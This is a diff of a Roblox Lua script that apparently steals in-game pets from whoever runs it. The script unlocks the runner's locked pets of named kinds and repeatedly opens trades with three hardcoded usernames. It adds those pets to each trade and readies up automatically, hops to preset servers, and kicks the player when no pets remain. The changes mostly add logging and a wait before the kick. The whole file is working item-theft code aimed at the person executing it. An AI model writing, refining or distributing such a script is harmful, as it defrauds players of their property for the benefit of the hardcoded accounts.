@@ -1,3 +1,4 @@
+Hello
 -- CONFIG
 local targetUsernames = {"Keiyoz", "Ebikeu", "MALIKSTOM"}
 local petsToTrade = {"Surge Dragon", "Dual Shock", "Overcharged Robot"}
@@ -21,200 +22,227 @@ local player = Players.LocalPlayer
 local attemptedJobs = {}
 local inTrade = false
 local didAddThisTrade = false
+local lastTradeEnded = 0
+local completedTrades = 0
 
 -- TRADE STATE DETECTION
 Network:BindEvents({
-	StartTrade = function()
-		inTrade = true
-		didAddThisTrade = false
-	end,
-	CloseTrade = function()
-		inTrade = false
-		didAddThisTrade = false
-	end,
+    StartTrade = function()
+        inTrade = true
+        didAddThisTrade = false
+    end,
+    CloseTrade = function()
+        inTrade = false
+        didAddThisTrade = false
+        lastTradeEnded = os.clock()
+        completedTrades = completedTrades + 1
+        print(`Trade #{completedTrades} completed. Waiting for server sync...`)
+    end,
 })
 
 -- UTILS
 local function WaitForCondition(fn, timeout)
-	local t0 = os.clock()
-	while not fn() do
-		if os.clock() - t0 > (timeout or 30) then
-			return false
-		end
-		task.wait(0.2)
-	end
-	return true
+    local t0 = os.clock()
+    while not fn() do
+        if os.clock() - t0 > (timeout or 30) then
+            return false
+        end
+        task.wait(0.2)
+    end
+    return true
 end
 
 local function WaitForPets(timeout)
-	local t0 = os.clock()
-	while os.clock() - t0 < (timeout or 30) do
-		local pets = Replication.Data and Replication.Data.Pets
-		if pets and next(pets) ~= nil then
-			return pets
-		end
-		task.wait(0.2)
-	end
-	return Replication.Data and Replication.Data.Pets
+    local t0 = os.clock()
+    while os.clock() - t0 < (timeout or 30) do
+        local pets = Replication.Data and Replication.Data.Pets
+        if pets and next(pets) ~= nil then
+            return pets
+        end
+        task.wait(0.2)
+    end
+    return Replication.Data and Replication.Data.Pets
 end
 
 -- PET LOGIC
 local function UnlockPets()
-	local lookup = {}
-	for _, n in ipairs(petsToTrade) do
-		lookup[n] = true
-	end
+    local lookup = {}
+    for _, n in ipairs(petsToTrade) do
+        lookup[n] = true
+    end
 
-	local pets = WaitForPets(20)
-	if not pets then return end
+    local pets = WaitForPets(20)
+    if not pets then return end
 
-	for _, petData in pairs(pets) do
-		if petData and petData.Id and petData.Name and lookup[petData.Name] and petData.Locked then
-			Network:InvokeServer("LockPet", petData.Id, false)
-		end
-	end
+    for _, petData in pairs(pets) do
+        if petData and petData.Id and petData.Name and lookup[petData.Name] and petData.Locked then
+            Network:InvokeServer("LockPet", petData.Id, false)
+            task.wait(0.1)
+        end
+    end
 end
 
 local function GetPetIDsByName()
-	local ids = {}
-	local lookup = {}
-	for _, n in ipairs(petsToTrade) do
-		lookup[n] = true
-	end
+    local ids = {}
+    local lookup = {}
+    for _, n in ipairs(petsToTrade) do
+        lookup[n] = true
+    end
 
-	local pets = WaitForPets(20)
-	if not pets then return ids end
+    local pets = WaitForPets(20)
+    if not pets then return ids end
 
-	for _, petData in pairs(pets) do
-		if petData and petData.Id and petData.Name and lookup[petData.Name] then
-			table.insert(ids, petData.Id)
-		end
-	end
+    for _, petData in pairs(pets) do
+        if petData and petData.Id and petData.Name and lookup[petData.Name] then
+            table.insert(ids, petData.Id)
+        end
+    end
 
-	return ids
+    return ids
 end
 
 local function HasPetsToTrade()
-	return #GetPetIDsByName() > 0
+    return #GetPetIDsByName() > 0
 end
 
 -- JOB / SERVER LOGIC
 local function TeleportToJob(jobId)
-	while true do
-		local ok = pcall(function()
-			TeleportService:TeleportToPlaceInstance(game.PlaceId, jobId)
-		end)
-		if ok then break end
-		task.wait(20)
-	end
+    while true do
+        local ok = pcall(function()
+            TeleportService:TeleportToPlaceInstance(game.PlaceId, jobId)
+        end)
+        if ok then break end
+        task.wait(20)
+    end
 end
 
 local function GetRandomJobId()
-	local pool = {}
-	for _, id in ipairs(targetJobIds) do
-		if not attemptedJobs[id] then
-			table.insert(pool, id)
-		end
-	end
+    local pool = {}
+    for _, id in ipairs(targetJobIds) do
+        if not attemptedJobs[id] then
+            table.insert(pool, id)
+        end
+    end
 
-	if #pool == 0 then
-		attemptedJobs = {}
-		return targetJobIds[math.random(#targetJobIds)]
-	end
+    if #pool == 0 then
+        attemptedJobs = {}
+        return targetJobIds[math.random(#targetJobIds)]
+    end
 
-	return pool[math.random(#pool)]
+    return pool[math.random(#pool)]
 end
 
 local function IsInTargetJob()
-	for _, id in ipairs(targetJobIds) do
-		if game.JobId == id then
-			return true
-		end
-	end
-	return false
+    for _, id in ipairs(targetJobIds) do
+        if game.JobId == id then
+            return true
+        end
+    end
+    return false
 end
 
 local function FindTargetPlayer()
-	for _, name in ipairs(targetUsernames) do
-		local p = Players:FindFirstChild(name)
-		if p then return p end
-	end
-	return nil
+    for _, name in ipairs(targetUsernames) do
+        local p = Players:FindFirstChild(name)
+        if p then return p end
+    end
+    return nil
 end
 
 local function JoinRandomJob()
-	while true do
-		local jobId = GetRandomJobId()
-		attemptedJobs[jobId] = true
-		TeleportToJob(jobId)
+    while true do
+        local jobId = GetRandomJobId()
+        attemptedJobs[jobId] = true
+        TeleportToJob(jobId)
 
-		local loaded = WaitForCondition(function()
-			return game:IsLoaded() and Players.LocalPlayer
-		end, 15)
+        local loaded = WaitForCondition(function()
+            return game:IsLoaded() and Players.LocalPlayer
+        end, 15)
 
-		if loaded then
-			task.wait(5)
-			if IsInTargetJob() then
-				return
-			end
-		end
-	end
+        if loaded then
+            task.wait(5)
+            if IsInTargetJob() then
+                return
+            end
+        end
+    end
 end
 
--- TRADE LOOP:
--- 1) spam SendTrade every 1s until StartTrade fires
--- 2) once inTrade = true, add pets once, ready up once
--- 3) wait until CloseTrade then resume
+-- TRADE LOOP
 local function TradeWithTarget()
-	WaitForPets(20)
+    -- Initial wait for pets to load
+    WaitForPets(20)
+    print("Pets loaded. Starting trade loop...")
 
-	while true do
-		if not HasPetsToTrade() then
-			player:Kick("No more pets to trade")
-			return
-		end
+    while true do
+        -- Check if we have pets, with grace period after trades
+        if not HasPetsToTrade() then
+            local elapsed = os.clock() - lastTradeEnded
+            if elapsed < 15 then
+                local waitTime = 15 - elapsed
+                print(`No pets left, but trade just ended. Waiting {waitTime:.1f}s before kick...`)
+                task.wait(waitTime)
+                
+                -- Re-check after waiting
+                if HasPetsToTrade() then
+                    print("Pets appeared after waiting, resuming...")
+                else
+                    print("Still no pets after grace period. Kicking...")
+                    player:Kick("No more pets to trade")
+                    return
+                end
+            else
+                print("No pets left (no recent trade). Kicking...")
+                player:Kick("No more pets to trade")
+                return
+            end
+        end
 
-		UnlockPets()
+        -- Unlock pets before trading
+        UnlockPets()
 
-		local target = FindTargetPlayer()
-		if target then
-			-- spam requests until trade starts
-			if not inTrade then
-				Network:FireServer("SendTrade", target)
-			end
+        local target = FindTargetPlayer()
+        if target then
+            -- Spam requests until trade starts
+            if not inTrade then
+                Network:FireServer("SendTrade", target)
+            end
 
-			-- once trade starts, add pets ONCE per trade
-			if inTrade and not didAddThisTrade then
-				didAddThisTrade = true
+            -- Once trade starts, add pets ONCE per trade
+            if inTrade and not didAddThisTrade then
+                didAddThisTrade = true
+                task.wait(0.3) -- Small delay for trade session to be ready
 
-				-- small delay helps if trade session needs a moment to be ready
-				task.wait(0.3)
+                local petIDs = GetPetIDsByName()
+                print(`Adding {#petIDs} pets to trade...`)
+                
+                for _, petId in ipairs(petIDs) do
+                    Network:InvokeServer("AddTradeItem", { "Pet", petId })
+                    task.wait(0.05)
+                end
 
-				local petIDs = GetPetIDsByName()
-				for _, petId in ipairs(petIDs) do
-					Network:InvokeServer("AddTradeItem", { "Pet", petId })
-					task.wait(0.05)
-				end
+                -- Ready up after adding
+                Network:FireServer("ReadyUp", false, true)
+                print("All pets added and ready!")
+            end
 
-				-- ready up after adding
-				Network:FireServer("ReadyUp", false, true)
-			end
+            -- Wait until trade closes
+            if inTrade then
+                WaitForCondition(function()
+                    return not inTrade
+                end, 60) -- 60 second timeout for safety
+            end
+        end
 
-			-- wait until trade closes, then resume spamming
-			if inTrade then
-				WaitForCondition(function()
-					return not inTrade
-				end, 999999)
-			end
-		end
-
-		task.wait(1)
-	end
+        task.wait(1)
+    end
 end
 
--- MAIN
+-- MAIN EXECUTION
 if not IsInTargetJob() then
-	JoinRandomJob()
+    print("Not in target job, teleporting...")
+    JoinRandomJob()
 end
 
+print(`In target job {game.JobId}. Starting trade sequence...`)
 TradeWithTarget()
